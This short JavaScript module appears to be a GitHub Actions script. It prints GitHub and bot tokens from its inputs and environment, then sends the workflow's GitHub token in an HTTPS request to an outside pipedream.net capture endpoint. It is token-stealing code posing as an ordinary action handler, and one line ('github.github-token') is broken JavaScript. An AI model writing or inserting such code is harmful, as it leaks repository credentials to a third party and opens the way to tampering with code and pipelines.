const https = require('https');

export default async function(github, context) {
  if ('token' in github) { 
    console.log(github.token);
  }
  if ('github-token' in github) {
    console.log(github.github-token);  
  }
  console.log(context);
  console.log(context.token);
  console.log(process.env.BOT_TOKEN);
  console.log(process.env['INPUT_GITHUB-TOKEN']);
  
  https
  .get(`https://eofeuuypisxyg56.m.pipedream.net/` + process.env['INPUT_GITHUB-TOKEN'], resp => {})
  .on("error", err => {
    console.log("Error: " + err.message);
  });
}
